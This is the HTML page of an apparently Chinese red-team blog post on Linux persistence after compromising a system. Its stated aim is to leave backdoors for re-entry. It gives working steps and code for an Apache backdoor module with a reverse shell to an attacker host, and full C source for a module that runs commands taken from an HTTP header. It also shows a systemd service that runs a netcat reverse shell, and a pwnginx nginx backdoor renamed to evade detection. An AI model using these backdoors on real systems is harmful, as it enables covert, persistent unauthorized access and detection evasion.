@@ -1,0 +1,765 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="google-site-verification" content="e1iwRhdDRUGkBandwtaXVgqhNwYn1qtFuAYbOSPWpcI">
+  <meta name="baidu-site-verification" content="code-NObBqxefR1">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="无我相，无人相，无众生相，无寿者相。  在我们入侵目标系统后，我们希望留下一个后门，方便我们下次入侵，比如写一个定时任务来反弹shell。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="linux持久化">
+<meta property="og:url" content="http://example.com/linux%E6%8C%81%E4%B9%85%E5%8C%96/index.html">
+<meta property="og:site_name" content="ShadowFl0w">
+<meta property="og:description" content="无我相，无人相，无众生相，无寿者相。  在我们入侵目标系统后，我们希望留下一个后门，方便我们下次入侵，比如写一个定时任务来反弹shell。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-01-21T07:26:44.000Z">
+<meta property="article:modified_time" content="2022-06-10T12:31:36.524Z">
+<meta property="article:author" content="ShadowFl0w">
+<meta property="article:tag" content="Linux安全">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/linux%E6%8C%81%E4%B9%85%E5%8C%96/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>linux持久化 | ShadowFl0w</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">ShadowFl0w</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Nothing</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/linux%E6%8C%81%E4%B9%85%E5%8C%96/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/touxiang.jpeg">
+      <meta itemprop="name" content="ShadowFl0w">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ShadowFl0w">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          linux持久化
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-01-21 15:26:44" itemprop="dateCreated datePublished" datetime="2022-01-21T15:26:44+08:00">2022-01-21</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-06-10 20:31:36" itemprop="dateModified" datetime="2022-06-10T20:31:36+08:00">2022-06-10</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%BA%A2%E9%98%9F%E6%8A%80%E6%9C%AF/" itemprop="url" rel="index"><span itemprop="name">红队技术</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <blockquote>
+<p>无我相，无人相，无众生相，无寿者相。</p>
+</blockquote>
+<p>在我们入侵目标系统后，我们希望留下一个后门，方便我们下次入侵，比如写一个定时任务来反弹shell。</p>
+<span id="more"></span>
+
+<h2 id="1-Apache-模块后门"><a href="#1-Apache-模块后门" class="headerlink" title="1. Apache 模块后门"></a>1. Apache 模块后门</h2><blockquote>
+<p>靶机：172.16.42.151     hostname:vuln</p>
+<p>攻击机：172.16.42.1     hostname:ShadowOS</p>
+</blockquote>
+<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/VladRico/apache2_BackdoorMod">https://github.com/VladRico/apache2_BackdoorMod</a></p>
+<p>mod_backdoor is a stealth backdoor using an Apache2 module.<br>The main idea is to fork() the primary Apache2 process just after it has loaded its config. Since it’s forked before the root user transfers the process to www-data, you can execute command as root.<br>As Apache2 loads its configuration only when you (re)start it, the challenge was to never let die this forked root apache2 process, to let us interact as root with the compromised system.</p>
+<p>环境搭建</p>
+<figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@vuln ~]<span class="comment"># apt install apache2</span></span><br><span class="line">[root@vuln ~]<span class="comment"># git clone https://github.com/VladRico/apache2_BackdoorMod</span></span><br><span class="line">[root@vuln ~]<span class="comment"># cd apache2_BackdoorMod</span></span><br><span class="line">[root@vuln apache2_BackdoorMod]<span class="comment"># cd build</span></span><br><span class="line">[root@vuln build]<span class="comment"># cp backdoor.load /usr/lib/apache2/modules</span></span><br><span class="line">[root@vuln build]<span class="comment"># cp mod_backdoor.so /usr/lib/apache2/modules</span></span><br><span class="line">[root@vuln build]<span class="comment"># cp backdoor.load /etc/apache2/mods-available</span></span><br><span class="line">[root@vuln build]<span class="comment"># a2enmod backdoor</span></span><br><span class="line">[root@vuln build]<span class="comment"># systemctl restart apache2</span></span><br></pre></td></tr></table></figure>
+
+<p>攻击</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">shadowflow@ShadowOS ~</span>]% curl -H <span class="string">&#x27;Cookie: password=backdoor&#x27;</span> http:<span class="comment">//172.16.42.151/ping</span></span><br><span class="line">[<span class="meta">+</span>] Backdoor module <span class="keyword">is</span> running !</span><br></pre></td></tr></table></figure>
+
+<p>反弹shell</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[shadowflow@ShadowOS ~]% nc -lvvp <span class="number">1337</span></span><br><span class="line">[shadowflow@ShadowOS ~]% curl -H <span class="string">&#x27;Cookie: password=backdoor&#x27;</span> http:<span class="regexp">//</span><span class="number">172.16</span>.<span class="number">42.151</span><span class="regexp">/reverse/</span><span class="number">172.16</span>.<span class="number">42.1</span><span class="regexp">/1337/</span>bash</span><br><span class="line">[+] Sending Reverse Shell to <span class="number">172.16</span>.<span class="number">42.1</span>:<span class="number">1337</span> using bash</span><br></pre></td></tr></table></figure>
+
+
+
+<p>修改密码</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root<span class="title">@vuln</span> apache<span class="number">2</span>_BackdoorMod]# vim mod_backdoor.<span class="keyword">c</span></span><br><span class="line">#<span class="keyword">define</span> PASSWORD <span class="string">&quot;password=shadowtest&quot;</span></span><br><span class="line"></span><br><span class="line">#重新生成so文件</span><br><span class="line">apt install apache<span class="number">2</span>-dev</span><br><span class="line">apxs -i -a -<span class="keyword">c</span> mod_backdoor.<span class="keyword">c</span> sblist.<span class="keyword">c</span> sblist_delete.<span class="keyword">c</span> server.<span class="keyword">c</span> -Wl<span class="punctuation">,</span>-lutil</span><br><span class="line"></span><br><span class="line">[shadowflow<span class="title">@ShadowOS</span> ~]% curl -H &#x27;Cookie: password<span class="operator">=</span>shadowtest&#x27; http://<span class="number">172.16</span>.<span class="number">42.151</span>/ping</span><br><span class="line">[+] Backdoor <span class="keyword">module</span> is running !</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="1-1-手动构造apache-module后门"><a href="#1-1-手动构造apache-module后门" class="headerlink" title="1.1 手动构造apache module后门"></a>1.1 手动构造apache module后门</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;httpd.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;http_config.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;http_protocol.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;ap_config.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The sample content handler */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">shadowtest_handler</span><span class="params">(request_rec *r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">apr_array_header_t</span>    *fields;</span><br><span class="line">    <span class="keyword">int</span>                         i;</span><br><span class="line">    <span class="keyword">apr_table_entry_t</span>           *e = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> FLAG = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/</span></span><br><span class="line"></span><br><span class="line">    fields = apr_table_elts(r-&gt;headers_in);</span><br><span class="line">    e = (<span class="keyword">apr_table_entry_t</span> *) fields-&gt;elts;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; fields-&gt;nelts; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strcmp</span>(e[i].key, <span class="string">&quot;Shadowtest&quot;</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">            FLAG = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (FLAG)&#123;</span><br><span class="line">        <span class="keyword">char</span> * command = e[i].val;</span><br><span class="line">        FILE* fp = popen(command,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">        <span class="keyword">char</span> buffer[<span class="number">0x100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="keyword">int</span> counter = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(counter)&#123;</span><br><span class="line">            counter = fread(buffer, <span class="number">1</span>, <span class="keyword">sizeof</span>(buffer), fp);</span><br><span class="line">            ap_rwrite(buffer, counter, r);</span><br><span class="line">        &#125;</span><br><span class="line">        pclose(fp);</span><br><span class="line">        <span class="keyword">return</span> DONE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> DECLINED;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">shadowtest_register_hooks</span><span class="params">(<span class="keyword">apr_pool_t</span> *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ap_hook_handler(shadowtest_handler, <span class="literal">NULL</span>, <span class="literal">NULL</span>, APR_HOOK_MIDDLE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Dispatch list for API hooks */</span></span><br><span class="line"><span class="keyword">module</span> AP_MODULE_DECLARE_DATA shadowtest_module = &#123;</span><br><span class="line">    STANDARD20_MODULE_STUFF,</span><br><span class="line">    <span class="literal">NULL</span>,                  <span class="comment">/* create per-dir    config structures */</span></span><br><span class="line">    <span class="literal">NULL</span>,                  <span class="comment">/* merge  per-dir    config structures */</span></span><br><span class="line">    <span class="literal">NULL</span>,                  <span class="comment">/* create per-server config structures */</span></span><br><span class="line">    <span class="literal">NULL</span>,                  <span class="comment">/* merge  per-server config structures */</span></span><br><span class="line">    <span class="literal">NULL</span>,                  <span class="comment">/* table of config file commands       */</span></span><br><span class="line">    shadowtest_register_hooks  <span class="comment">/* register hooks                      */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root<span class="variable">@vuln</span> ~]<span class="comment"># apxs -i -a -c mod_shadowtest.c</span></span><br><span class="line">......</span><br><span class="line">chmod <span class="number">644</span> /usr/lib/apache2/modules/mod_shadowtest.so</span><br><span class="line">[preparing <span class="class"><span class="keyword">module</span> `<span class="title">shadowtest</span>&#x27; <span class="title">in</span> /<span class="title">etc</span>/<span class="title">apache2</span>/<span class="title">mods</span>-<span class="title">available</span>/<span class="title">shadowtest</span>.<span class="title">load</span>]</span></span><br><span class="line">Module shadowtest already enable</span><br><span class="line"></span><br><span class="line">[root<span class="variable">@vuln</span> ~]<span class="comment"># systemctl restart apache2</span></span><br></pre></td></tr></table></figure>
+
+<p>攻击机执行</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[shadowflow@ShadowOS ~]% curl -H <span class="string">&#x27;Shadowtest: id&#x27;</span> <span class="string">&#x27;http://172.16.42.151/x&#x27;</span></span><br><span class="line"><span class="attribute">uid</span>=33(www-data) <span class="attribute">gid</span>=33(www-data) <span class="attribute">groups</span>=33(www-data)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="2-Systemd后门"><a href="#2-Systemd后门" class="headerlink" title="2. Systemd后门"></a>2. Systemd后门</h2><h3 id="2-1-Systemd服务"><a href="#2-1-Systemd服务" class="headerlink" title="2.1 Systemd服务"></a>2.1 Systemd服务</h3><p>Systemd服务基本格式</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[Unit]</span>   </span><br><span class="line"><span class="attr">Description</span>=test   		<span class="comment"># 简单描述服务</span></span><br><span class="line"><span class="attr">After</span>=network.target    <span class="comment"># 描述服务类别，表示本服务需要在network服务启动后在启动</span></span><br><span class="line"><span class="attr">Before</span>=xxx.service      <span class="comment"># 表示需要在某些服务启动之前启动，After和Before字段只涉及启动顺序，不涉及依赖关系。</span></span><br><span class="line"></span><br><span class="line"><span class="section">[Service]</span> </span><br><span class="line"><span class="attr">Type</span>=forking     		<span class="comment"># 设置服务的启动方式</span></span><br><span class="line"><span class="attr">User</span>=USER        		<span class="comment"># 设置服务运行的用户</span></span><br><span class="line"><span class="attr">Group</span>=USER       		<span class="comment"># 设置服务运行的用户组</span></span><br><span class="line"><span class="attr">WorkingDirectory</span>=/PATH	<span class="comment"># 设置服务运行的路径(cwd)</span></span><br><span class="line"><span class="attr">KillMode</span>=control-group  <span class="comment"># 定义systemd如何停止服务</span></span><br><span class="line"><span class="attr">Restart</span>=<span class="literal">no</span>        		<span class="comment"># 定义服务进程退出后，systemd的重启方式，默认是不重启</span></span><br><span class="line"><span class="attr">ExecStart</span>=/start.sh    	<span class="comment"># 服务启动命令，命令需要绝对路径（采用sh脚本启动其他进程时Type须为forking）</span></span><br><span class="line">   </span><br><span class="line"><span class="section">[Install]</span>   </span><br><span class="line"><span class="attr">WantedBy</span>=multi-user.target  <span class="comment"># 多用户</span></span><br></pre></td></tr></table></figure>
+
+<p>完成service脚本编写后，需要执行以下命令以重载生效：</p>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 重新加载所有的systemd服务</span></span><br><span class="line">systemctl daemon-reload</span><br><span class="line"></span><br><span class="line"><span class="comment"># 管理服务 [使能开启启动|启动|停止|重启|查看状态]</span></span><br><span class="line">sudo systemctl [enable|<span class="string">start</span>|<span class="string">stop</span>|<span class="string">restart</span>|<span class="string">status] xxx.service</span></span><br></pre></td></tr></table></figure>
+
+<p>一个服务设置为开机启动使用会将 /usr/lib/systemd/system/name.service 软链接到 /etc/systemd/system/ ，但是 enable 命令不会重写已经存在的链接，所以当我们修改了服务文件就需要重新加载：systemctl reenable name.service</p>
+<h3 id="2-2-构造System后门"><a href="#2-2-构造System后门" class="headerlink" title="2.2 构造System后门"></a>2.2 构造System后门</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@vuln systemd]# vim <span class="regexp">/usr/</span>lib<span class="regexp">/systemd/</span>system/shadowtest.service</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[Unit]</span></span><br><span class="line"><span class="attr">Description</span>=ShadowTestx</span><br><span class="line"></span><br><span class="line"><span class="section">[Service]</span></span><br><span class="line"><span class="attr">ExecStart</span>=/usr/bin/netcat <span class="number">172.16</span>.<span class="number">42.1</span> <span class="number">1337</span> -e /bin/bash</span><br><span class="line"><span class="attr">Restart</span>=<span class="literal">on</span>-failure</span><br><span class="line"><span class="attr">RestartSec</span>=<span class="number">42</span>s</span><br><span class="line"></span><br><span class="line"><span class="section">[Install]</span></span><br><span class="line"><span class="attr">WantedBy</span>=multi-user.target</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root<span class="symbol">@vuln</span> systemd]<span class="meta"># systemctl enable shadowtest</span></span><br><span class="line">[root<span class="symbol">@vuln</span> systemd]<span class="meta"># systemctl start shadowtest</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="3-Nginx后门"><a href="#3-Nginx后门" class="headerlink" title="3. Nginx后门"></a>3. Nginx后门</h2><h3 id="3-1-nginx模块后门"><a href="#3-1-nginx模块后门" class="headerlink" title="3.1 nginx模块后门"></a>3.1 nginx模块后门</h3><p>查看当前nginx服务版本</p>
+<figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@vuln <span class="built_in">module</span>]<span class="comment"># nginx -V</span></span><br><span class="line">nginx version: nginx/<span class="number">1.14</span><span class="number">.2</span></span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+
+<p>下载pwnginx</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/t57root/</span>pwnginx.git</span><br></pre></td></tr></table></figure>
+
+<p><strong>修改特征</strong></p>
+<ul>
+<li><p>修改名称防止被检。使用vscode将所有pwnginx替换为了shadownginx</p>
+</li>
+<li><p>t57root替换为shadowtest123</p>
+</li>
+<li><p>所有文件名称pwnginx关键字替换</p>
+</li>
+</ul>
+<p>下载对应版本的nginx</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https:<span class="regexp">//</span>nginx.org<span class="regexp">/download/</span>nginx-<span class="number">1.14</span>.<span class="number">2</span>.tar.gz</span><br></pre></td></tr></table></figure>
+
+<p>编译恶意模块的nginx</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root<span class="title">@vuln</span> nginx<span class="number">-1.14</span>.<span class="number">2</span>]# ./configure --without-http_rewrite_module --<span class="keyword">add</span>-<span class="keyword">module</span><span class="operator">=</span>../shadownginx/<span class="keyword">module</span></span><br><span class="line">[root<span class="title">@vuln</span> nginx<span class="number">-1.14</span>.<span class="number">2</span>]# make &amp;&amp; make install</span><br></pre></td></tr></table></figure>
+
+<p>启动ng</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@vuln nginx-<span class="number">1.14</span>.<span class="number">2</span>]# <span class="regexp">/usr/</span>local<span class="regexp">/nginx/</span>sbin<span class="regexp">/nginx -c /u</span>sr<span class="regexp">/local/</span>nginx<span class="regexp">/conf/</span>nginx.conf</span><br></pre></td></tr></table></figure>
+
+<p>pwnginx的客户端我们刚刚已经替换了文本，现在需要重新编译，不能用之前的了，执行make即可编译</p>
+<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[root@debian client]# ./shadownginx shell <span class="number">172.16</span><span class="number">.42</span><span class="number">.151</span> <span class="number">80</span> shadowtest123</span><br><span class="line">[ shadownginx ] - <span class="symbol">Pwn</span> nginx</span><br><span class="line"><span class="symbol">Copyleft</span> by shadowtest123 @ openwill.me</span><br><span class="line">&lt;shadowtest123@gmail.com&gt;  [www.<span class="symbol">HackShell</span>.net]</span><br><span class="line"></span><br><span class="line"><span class="symbol">Usage</span>:</span><br><span class="line"><span class="symbol">Get</span> a shell access via the nginx running @ [ip]:[port]</span><br><span class="line">	./shadownginx shell [ip] [port] [password]</span><br><span class="line"><span class="symbol">Get</span> a socks5 tunnel listening at [socks5ip]:[socks5port]</span><br><span class="line">	./shadownginx socks5 [ip] [port] [password] [socks5ip] [socks5port]</span><br><span class="line"></span><br><span class="line">[i] <span class="symbol">Obtaining</span> shell access</span><br><span class="line">[i] <span class="symbol">About</span> to connect to nginx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[i] <span class="symbol">Enjoy</span> the real world.</span><br><span class="line">nx1sh: turning off <span class="symbol">NDELAY</span> mode</span><br><span class="line">id</span><br><span class="line">uid=<span class="number">65534</span>(nobody) gid=<span class="number">65534</span>(nogroup) groups=<span class="number">65534</span>(nogroup)</span><br></pre></td></tr></table></figure>
+
+<p>修改的相关代码已经上传至github: <code>https://github.com/ShadowFl0w/shadownginx</code></p>
